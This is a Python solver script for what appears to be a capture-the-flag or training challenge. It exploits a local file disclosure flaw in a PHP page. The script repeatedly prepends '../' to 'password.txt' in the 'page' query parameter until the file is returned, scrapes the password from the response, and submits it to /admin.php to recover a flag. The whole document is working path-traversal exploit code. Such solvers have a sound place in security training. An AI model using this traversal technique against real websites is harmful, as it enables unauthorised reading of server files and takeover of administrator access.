import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

from bs4 import BeautifulSoup

BASE_URL = "https://php-lfd.quoccacorp.com"
TARGET_FILENAME = "password.txt"

class Solver:
    def __init__(self):
        self.session = get_session()

    def _search_password(self):
        i = 0
        while True:
            payload = f"{"../" * i}{TARGET_FILENAME}"
            response = self.session.get(BASE_URL, params={"page": payload})

            soup = BeautifulSoup(response.text, "html.parser")
            main_element_text = soup.find("main").get_text(separator="\n")
            if "No such file or directory" not in main_element_text:
                return main_element_text.splitlines()[-1].strip()

            i += 1

    def main(self):
        response = self.session.post(f"{BASE_URL}/admin.php", data={"pass": self._search_password()})
        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()